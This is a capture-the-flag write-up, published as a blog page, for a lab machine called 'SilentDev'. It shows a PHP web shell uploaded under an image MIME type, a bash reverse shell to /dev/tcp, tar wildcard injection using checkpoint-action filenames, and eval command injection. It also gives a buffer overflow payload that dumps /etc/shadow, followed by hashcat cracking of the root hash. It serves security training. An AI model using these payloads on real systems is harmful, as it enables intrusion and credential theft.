<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SilentDev - By me | Conper</title>
<meta name="keywords" content="">
<meta name="description" content="Difficulty: Medium üü†">
<meta name="author" content="">
<link rel="canonical" href="https://conper.xyz/writeups/medium/silentdev/">
<link crossorigin="anonymous" href="https://conper.xyz/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://conper.xyz/assets/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://conper.xyz/assets/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://conper.xyz/assets/favicon.ico">
<link rel="apple-touch-icon" href="https://conper.xyz/apple-touch-icon.png">
<link rel="mask-icon" href="https://conper.xyz/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://conper.xyz/writeups/medium/silentdev/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://conper.xyz/writeups/medium/silentdev/">
  <meta property="og:site_name" content="Conper">
  <meta property="og:title" content="SilentDev - By me">
  <meta property="og:description" content="Difficulty: Medium üü†">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SilentDev - By me">
<meta name="twitter:description" content="Difficulty: Medium üü†">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "https://conper.xyz/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Medium machines",
      "item": "https://conper.xyz/writeups/medium/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "SilentDev - By me",
      "item": "https://conper.xyz/writeups/medium/silentdev/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SilentDev - By me",
  "name": "SilentDev - By me",
  "description": "Difficulty: Medium üü†",
  "keywords": [
    
  ],
  "articleBody": "\rMachine Link\nThe first thing we will do is perform a quick Nmap scan to see which ports are open.\nOnce we know the open ports, we will perform a more detailed scan on them to identify the services running and their versions.\nThe target machine is hosting an SSH server and a website. When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u003c?php\recho \"\" . shell_exec($_REQUEST['cmd']) . \"\";\r?\u003e We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the ‚ÄúFilename‚Äù field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let‚Äôs see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there‚Äôs not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there‚Äôs nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there‚Äôs a file with a malicious name, that name could be executed as a command during the backup. Here‚Äôs an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \"bash -i \u003e\u0026 /dev/tcp/YOUR_IP/PORT 0\u003e\u00261\" \u003e revshell.sh\recho \"\" \u003e --checkpoint=1\recho \"\" \u003e \"--checkpoint-action=exec=bash revshell.sh\" We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it‚Äôs as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso‚Äôs folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here‚Äôs a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\nüìùNOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u003c\u003c\u003c 'PATTERN' Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u003c\u003c\u003c $(python3 -c 'print(\"A\"*76 + \"B\"*4)') It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u003c\u003c\u003c $(python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*76 + b\"\\x05\\x99\\x04\\x08\")') We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u003c\u003c\u003c $(python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*76 + b\"\\x05\\x99\\x04\\x08\")') We obtain the root user‚Äôs password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained! We log in as root and finally get the Root Flag.\nMachine completed!!\n",
  "wordCount" : "1029",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://conper.xyz/writeups/medium/silentdev/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Conper",
    "logo": {
      "@type": "ImageObject",
      "url": "https://conper.xyz/assets/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://conper.xyz/" accesskey="h" title="Conper (Alt + H)">Conper</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://conper.xyz/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://conper.xyz/writeups/" title="Writeups">
                    <span>Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://conper.xyz/projects/" title="My Projects">
                    <span>My Projects</span>
                </a>
            </li>
            <li>
                <a href="https://conper.xyz/cybersecurity/" title="Cybersecurity">
                    <span>Cybersecurity</span>
                </a>
            </li>
            <li>
                <a href="https://conper.xyz/it/" title="IT">
                    <span>IT</span>
                </a>
            </li>
            <li>
                <a href="https://conper.xyz/about/" title="About Me">
                    <span>About Me</span>
                </a>
            </li>
            <li>
                <a href="https://conper.xyz/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      SilentDev - By me
    </h1>
    <div class="post-meta">

</div>
  </header> 
  <div class="post-content"><style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>
<p><a href="https://mega.nz/file/8hQhFCAY#jJoZto-I8qkrtyPAssrI6f68kKWXEPd9OKy_4_I4VXY">Machine Link</a></p>
<p>The first thing we will do is perform a quick <strong>Nmap</strong> scan to see which <strong>ports</strong> are <strong>open</strong>.</p>
<p><img alt="1" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/1.png"></p>
<p>Once we know the <strong>open ports</strong>, we will perform a more <strong>detailed scan</strong> on them to identify the <strong>services</strong> running and their <strong>versions</strong>.</p>
<p><img alt="2" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/2.png"></p>
<p>The target machine is hosting an <strong>SSH</strong> server and a <strong>website</strong>.
When we access the website, we see that <strong>we can upload</strong> an image.</p>
<p><img alt="3" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/3.png"></p>
<p>By enumerating <strong>directories</strong> and <strong>files</strong> with <a href="https://github.com/OJ/gobuster"><strong>Gobuster</strong></a>, we discover the existence of a directory called <em><strong>/uploads</strong></em>, nothing else is visible.</p>
<p><img alt="4" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/4.png"></p>
<p>This is where the images uploaded by users are stored.</p>
<p><img alt="5" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/5.png"></p>
<p>We try uploading an image to see if it works.</p>
<p><img alt="6" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/6.png"></p>
<p><img alt="7" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/7.png"></p>
<p>The only way I see to gain access to the machine is to <strong>upload a file</strong> that allows us to <strong>execute commands</strong> without the machine noticing, making it think it is just an image.
For example, we could embed <strong>malicious PHP code</strong> into a supposed image.</p>
<pre tabindex="0"><code>&lt;?php
		echo &#34;&lt;pre&gt;&#34; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &#34;&lt;/pre&gt;&#34;;
?&gt;
</code></pre><p>We will create a file on our local machine called <em><strong>cmd.php.jpg</strong></em> containing the previous code, and when uploading it, we will intercept the request with <strong>Burp Suite</strong>. In the ‚ÄúFilename‚Äù field, we will change it to <em><strong>cmd.php</strong></em> while keeping the <strong>MIME type</strong> as if it were an image.</p>
<p><img alt="8" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/8.png"></p>
<p><img alt="9" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/9.png"></p>
<p>We upload it without any issues, and now <strong>we can execute any command</strong>.</p>
<p><img alt="10" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/10.png"></p>
<p>To access the machine, we will use a <strong>Reverse Shell</strong>.</p>
<p><img alt="11" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/11.png"></p>
<p><img alt="12" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/12.png"></p>
<p>Now that we are inside the machine, let‚Äôs see why it was so easy to exploit by uploading a <strong>PHP file</strong> without being detected.</p>
<p><img alt="13" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/13.png"></p>
<p>As we can see, it only restricted by <strong>MIME type</strong>, without actually verifying that the file was truly an image or a GIF.</p>
<p><img alt="14" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/14.png"></p>
<p>The <strong>www-data</strong> user is part of the <strong>developers</strong> group, and we see that they own two directories.</p>
<p><img alt="15" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/15.png"></p>
<p><img alt="16" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/16.png"></p>
<p>In <em><strong>/opt/project</strong></em>, we find an <strong>HTML file</strong> for someone named <strong>Vlad</strong>, but there‚Äôs not much else here.</p>
<p><img alt="17" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/17.png"></p>
<p>In the other directory, it seems to contain a backup of what looks like the previous project.</p>
<p>Since there‚Äôs nothing else particularly interesting, we could use the tool <a href="https://github.com/DominicBreuker/pspy"><strong>pspy</strong></a> to see which <strong>processes</strong> and <strong>tasks</strong> are running on the system in real time.</p>
<p><img alt="18" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/18.png"></p>
<p><img alt="19" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/19.png"></p>
<p>We can see that <strong>every minute</strong>, the <strong>Developer</strong> user performs a <strong>backup</strong> of everything in <em><strong>/opt/project</strong></em>, placing it into a file called <em><strong>project.tgz</strong></em> inside <em><strong>/var/backups/</strong></em> and compressing it with <strong>gzip</strong> to save space.</p>
<p>It is vulnerable because we have <strong>write permissions</strong> and it uses <code>*</code> to include all files. If there‚Äôs a file with a malicious name, that name could be executed as a command during the backup. Here‚Äôs an explanation on how to exploit this vulnerability: <a href="https://conper.xyz/cybersecurity/vulnsandexp/linux/#wildcard-injection"><strong>Wildcard Injection</strong></a></p>
<p>We execute the following commands in <em><strong>/opt/project</strong></em> and wait to receive the <strong>shell</strong>:</p>
<pre tabindex="0"><code>echo &#34;bash -i &gt;&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;1&#34; &gt; revshell.sh
echo &#34;&#34; &gt; --checkpoint=1
echo &#34;&#34; &gt; &#34;--checkpoint-action=exec=bash revshell.sh&#34;
</code></pre><p><img alt="20" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/20.png"></p>
<p>We are now the <strong>Developer</strong> user.</p>
<p><img alt="21" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/21.png"></p>
<p>By running the command <strong>sudo -l</strong>, we see that the script <em><strong>sysinfo.sh</strong></em> can be executed as <strong>alfonso</strong> without providing a password.</p>
<p><img alt="22" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/22.png"></p>
<p>The script is vulnerable because it uses <code>eval</code> with user input, which allows executing dangerous commands. An attacker can exploit this to <strong>run any command</strong>.</p>
<p>To test this, in the first input we enter 1, and in the second input we enter the command <code>id</code>, but we precede it with a <code>;</code> to separate commands. It will then execute:</p>
<pre tabindex="0"><code>df; id
</code></pre><p><img alt="23" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/23.png"></p>
<p><strong>It is vulnerable</strong>, so it‚Äôs as simple as running a <strong>Reverse Shell</strong> to become <strong>alfonso</strong>.</p>
<p><img alt="24" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/24.png"></p>
<p><img alt="25" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/25.png"></p>
<p>Now we can retrieve the <strong>User Flag</strong>.</p>
<p><img alt="26" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/26.png"></p>
<h2 id="root-escalation">Root Escalation<a hidden class="anchor" aria-hidden="true" href="#root-escalation">#</a></h2>
<p>The last step is to escalate to <strong>root</strong>. Again, by using <strong>sudo -l</strong>, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to <strong>root</strong>.</p>
<p><img alt="27" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/27.png"></p>
<p>We copy the file to <strong>Alfonso</strong>‚Äôs folder, start a temporary web server with <strong>Python</strong>, and <strong>download</strong> the binary to our <strong>local machine</strong> to test it in a more controlled environment.</p>
<p><img alt="28" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/28.png"></p>
<p><img alt="29" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/29.png"></p>
<p>We give it execution permissions and run it.</p>
<p><img alt="30" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/30.png"></p>
<p>We can see that it outputs user data from <em><strong>/etc/passwd</strong></em>.</p>
<p>Now, we will open it with <a href="https://github.com/NationalSecurityAgency/ghidra"><strong>Ghidra</strong></a> to <strong>analyze</strong> how it is implemented internally.</p>
<p><img alt="31" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/31.png"></p>
<p><img alt="32" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/32.png"></p>
<p>We can now see that it might be vulnerable to a <strong>Buffer Overflow</strong> because <code>gets(buffer)</code> allows writing more data than the buffer can hold, <strong>overwriting memory</strong> and potentially <strong>executing malicious code</strong>.</p>
<p><img alt="33" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/33.png"></p>
<p>However, by examining the code further, we find a function that has never been executed, which prints the contents of the <em><strong>/etc/shadow</strong></em> file.</p>
<p><img alt="34" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/34.png"></p>
<p>The plan is to exploit it using a <strong>Buffer Overflow</strong> to ultimately execute this function called <code>get_shadow</code>.</p>
<h3 id="buffer-overflow-exploitation">Buffer Overflow Exploitation<a hidden class="anchor" aria-hidden="true" href="#buffer-overflow-exploitation">#</a></h3>
<p>We will first create the complete <strong>payload</strong> on our local machine using <a href="https://sourceware.org/gdb/"><strong>gdb</strong></a>.
Here‚Äôs a guide on how to exploit a <strong>buffer overflow to execute functions</strong>: <a href="https://conper.xyz/cybersecurity/hacking/systemserviceexp/#introduction-to-buffer-overflow-invoking-functions-via-buffer-overflows"><strong>Buffer Overflow - Invoking Functions</strong></a></p>
<p>First, we create a <strong>pattern</strong> to find the <strong>offset</strong> and run the script, providing this pattern as input.</p>
<blockquote>
<p>üìù<strong>NOTE</strong>: In a <strong>Buffer Overflow</strong>, the <strong>offset</strong> is the <strong>number of bytes</strong> needed to reach the return address, which in x86 corresponds to the <strong>EIP</strong>. Overwriting it allows <strong>controlling where the program jumps</strong> when the function ends.</p></blockquote>
<p><img alt="35" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/35.png"></p>
<pre tabindex="0"><code>r &lt;&lt;&lt; &#39;PATTERN&#39;
</code></pre><p><img alt="36" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/36.png"></p>
<p>Now we can calculate <strong>how many characters</strong> are needed to reach the <strong>EIP</strong> with this command:</p>
<pre tabindex="0"><code>pattern offset $eip
</code></pre><p><img alt="37" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/37.png"></p>
<p>We can verify it like this to confirm the <strong>offset</strong> is actually <strong>76</strong>:</p>
<pre tabindex="0"><code>r &lt;&lt;&lt; $(python3 -c &#39;print(&#34;A&#34;*76 + &#34;B&#34;*4)&#39;)
</code></pre><p><img alt="38" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/38.png"></p>
<p>It is indeed <strong>76</strong>. Next, we need the <strong>memory address</strong> of the <code>get_shadow</code> <strong>function</strong> we found earlier in <strong>Ghidra</strong>.</p>
<pre tabindex="0"><code>p get_shadow
</code></pre><p><img alt="39" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/39.png"></p>
<p>We must write the address in <strong>little-endian</strong> (for example, <code>0x080484b6</code> as <code>\xb6\x84\x04\x08</code>), since systems store multi-byte values in that order for the function to execute correctly.</p>
<p>In our case, it will be:</p>
<pre tabindex="0"><code>\x05\x99\x04\x08
</code></pre><h6>We start converting from the end to the beginning.</h6>
<p>Now we have everything. Instead of <code>BBBB</code>, we use <code>\x05\x99\x04\x08</code>. The best way to execute it is:</p>
<pre tabindex="0"><code>./silentgets &lt;&lt;&lt; $(python3 -c &#39;import sys; sys.stdout.buffer.write(b&#34;A&#34;*76 + b&#34;\x05\x99\x04\x08&#34;)&#39;)
</code></pre><p>We will run it directly on the <strong>target machine</strong>, using <strong>sudo</strong> and the full path to the binary.</p>
<pre tabindex="0"><code>sudo /usr/bin/silentgets &lt;&lt;&lt; $(python3 -c &#39;import sys; sys.stdout.buffer.write(b&#34;A&#34;*76 + b&#34;\x05\x99\x04\x08&#34;)&#39;)
</code></pre><p><img alt="40" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/40.png"></p>
<p>We obtain the <strong>root</strong> user‚Äôs password <strong>hash</strong>, which we will crack using <a href="https://hashcat.net/hashcat/"><strong>hashcat</strong></a>.</p>
<pre tabindex="0"><code>hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img alt="41" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/41.png"></p>
<p><strong>Password obtained</strong>! We log in as <strong>root</strong> and finally get the <strong>Root Flag</strong>.</p>
<p><img alt="42" loading="lazy" src="https://conper.xyz/images/writeups/silentdev/42.png"></p>
<p>Machine completed!!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

<ul class="share-buttons">
    <li>Share: </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on x"
            href="https://x.com/intent/tweet/?text=SilentDev%20-%20By%20me&amp;url=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f&amp;title=SilentDev%20-%20By%20me&amp;summary=SilentDev%20-%20By%20me&amp;source=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f&title=SilentDev%20-%20By%20me">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on whatsapp"
            href="https://api.whatsapp.com/send?text=SilentDev%20-%20By%20me%20-%20https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
